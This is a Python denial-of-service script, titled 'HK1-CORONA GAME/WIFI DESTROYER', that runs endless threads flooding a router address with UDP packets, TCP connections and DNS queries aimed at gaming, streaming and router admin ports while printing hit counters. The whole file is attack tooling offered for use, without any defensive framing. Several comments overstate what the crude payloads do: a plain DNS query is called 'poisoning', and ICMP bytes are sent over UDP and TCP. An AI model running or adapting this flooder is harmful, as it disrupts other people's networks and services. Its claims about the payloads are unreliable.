import socket
import threading
import time
import random
import struct

target_ip = "192.168.1.1"  # ROUTER IP
GAMING_PORTS = [3074, 3478, 3479, 3480, 27014, 27015, 27016, 27017, 27018, 25565]
STREAMING_PORTS = [80, 443, 1935, 554, 8554]
DNS_PORT = 53

GREEN = '\033[92m'
RED = '\033[91m'
CYAN = '\033[96m'
RESET = '\033[0m'

# Gaming destruction payloads
def gaming_kill_1():
    """UDP to Xbox Live port (3074) with fake NAT data"""
    return b'\x00' * 128

def gaming_kill_2():
    """PlayStation Network flood (3478-3480)"""
    return b'\xff' * 256

def gaming_kill_3():
    """Steam game session flood"""
    return b'\xaa' * 512

def gaming_kill_4():
    """Minecraft server (25565) ping flood"""
    return b'\xfe\xfd\x09' + b'\x00' * 125

def gaming_kill_5():
    """Discord voice (UDP 3478-3480)"""
    return b'\x02' * 64

def gaming_kill_6():
    """Twitch stream interrupt (1935 RTMP)"""
    return b'RTMP' + b'\x00' * 124

def gaming_kill_7():
    """YouTube streaming (443) TLS alert"""
    return b'\x15\x03\x03\x00\x02\x02\x46'

def gaming_kill_8():
    """Netflix/Prime video (80/443) session kill"""
    return b'GET / HTTP/1.1\r\n\r\n'

def gaming_kill_9():
    """DNS gaming server resolution poison"""
    domain = random.choice(['xboxlive.com', 'psn.com', 'steam.com', 'minecraft.net'])
    query = struct.pack('>HHHHHH', random.randint(1, 65535), 0x0100, 1, 0, 0, 0)
    query += b''.join(struct.pack('B', len(part)) + part.encode() for part in domain.split('.'))[:-1]
    query += b'\x00\x00\x01\x00\x01'
    return query

def gaming_kill_10():
    """ICMP ping flood to gaming server IPs"""
    return b'\x08\x00\xf7\xff' + b'\x00' * 56

# Router CPU killer payloads
def router_crash_1():
    """SYN to all router admin ports"""
    return b''

def router_crash_2():
    """UDP to router DHCP (67/68)"""
    return b'\x00' * 300

def router_crash_3():
    """DNS NXDOMAIN bomb to router DNS"""
    return b'\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07invalid\x03com\x00\x00\x01\x00\x01'

def router_crash_4():
    """HTTP flood to router web interface"""
    return b'GET / HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n'

def router_crash_5():
    """UDP to random high ports (state table exhaustion)"""
    return b'X' * 1024

GAMING_PAYLOADS = [gaming_kill_1, gaming_kill_2, gaming_kill_3, gaming_kill_4, gaming_kill_5,
                   gaming_kill_6, gaming_kill_7, gaming_kill_8, gaming_kill_9, gaming_kill_10]

ROUTER_PAYLOADS = [router_crash_1, router_crash_2, router_crash_3, router_crash_4, router_crash_5]

# Stats
stats = {"gaming_hits": 0, "router_hits": 0, "data_sent": 0}
lock = threading.Lock()

def gaming_interrupt():
    """Direct attack on gaming/streaming traffic"""
    while True:
        try:
            port = random.choice(GAMING_PORTS + STREAMING_PORTS)
            payload_func = random.choice(GAMING_PAYLOADS)
            payload = payload_func()
            
            if port in [80, 443, 1935]:
                # TCP for streaming
                for _ in range(50):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.01)
                    sock.connect_ex((target_ip, port))
                    sock.send(payload)
                    sock.close()
                    
                    with lock:
                        stats["gaming_hits"] += 1
                        stats["data_sent"] += len(payload)
            else:
                # UDP for gaming
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(50):
                    sock.sendto(payload, (target_ip, port))
                    
                    with lock:
                        stats["gaming_hits"] += 1
                        stats["data_sent"] += len(payload)
                sock.close()
                
        except:
            pass
        time.sleep(0.01)

def router_cripple():
    """Crash router CPU/DNS"""
    while True:
        try:
            payload_func = random.choice(ROUTER_PAYLOADS)
            payload = payload_func()
            
            if payload_func.__name__ == "router_crash_1":
                # SYN flood to admin ports
                for port in [80, 443, 23, 22, 8080]:
                    for _ in range(25):
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.01)
                        sock.connect_ex((target_ip, port))
                        sock.close()
                        
                        with lock:
                            stats["router_hits"] += 1
                            stats["data_sent"] += 64
            elif payload_func.__name__ == "router_crash_3":
                # DNS bomb
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(100):
                    sock.sendto(payload, (target_ip, DNS_PORT))
                    
                    with lock:
                        stats["router_hits"] += 1
                        stats["data_sent"] += len(payload)
                sock.close()
            else:
                # General UDP flood
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                port = random.randint(10000, 60000)
                for _ in range(100):
                    sock.sendto(payload, (target_ip, port))
                    
                    with lock:
                        stats["router_hits"] += 1
                        stats["data_sent"] += len(payload)
                sock.close()
                
        except:
            pass
        time.sleep(0.01)

# Start attacks
threading.Thread(target=gaming_interrupt, daemon=True).start()
threading.Thread(target=router_cripple, daemon=True).start()

print(f"{RED}HK1-CORONA GAME/WIFI DESTROYER{RESET}")
print(f"{CYAN}Target Router: {target_ip}{RESET}")
print(f"{RED}Gaming Ports: {GAMING_PORTS}{RESET}")
print(f"{RED}Streaming Ports: {STREAMING_PORTS}{RESET}")
print()

last_time = time.time()
while True:
    time.sleep(5)
    
    with lock:
        gaming = stats["gaming_hits"]
        router = stats["router_hits"]
        data_mb = stats["data_sent"] / (1024 * 1024)
        
        stats["gaming_hits"] = 0
        stats["router_hits"] = 0
        stats["data_sent"] = 0
    
    total = gaming + router
    print(f"HK1:{GREEN}{total}{RESET}:{GREEN}{data_mb:.2f}MB{RESET}")
    print(f"{CYAN}Gaming Hits: {RED}{gaming}{RESET} | Router Hits: {RED}{router}{RESET}")
    print()
